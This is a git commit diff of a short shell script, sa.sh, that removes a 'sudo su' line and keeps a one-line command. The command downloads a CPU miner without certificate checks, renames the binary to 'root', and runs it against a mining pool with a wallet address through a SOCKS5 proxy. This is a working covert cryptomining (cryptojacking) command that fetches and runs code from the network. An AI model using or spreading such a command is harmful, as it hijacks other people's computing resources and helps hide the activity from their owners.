3f02d84d5170310a12a9bf2cfbe411db5176d40b
kendrapiplo <kendraqkzov944@gmail.com>
2026-05-16 00:06:21 +0700

    Update sa.sh

--- sa.sh
+++ sa.sh
@@ -1,2 +1,1 @@
-sudo su
 wget https://github.com/rplant-pool/cpuminer-rplant/releases/download/5.0.48/cpuminer-opt-linux-5.0.48.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux-5.0.48.tar.gz && mv cpuminer-sse42 root && ./root -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.na.mine.zpool.ca:6241 -u D97mtAzbd2BkfWWQgTKM9GsR5P6izepimm.na -p c=DOGE -t 3 --proxy socks5://192.252.220.89:4145
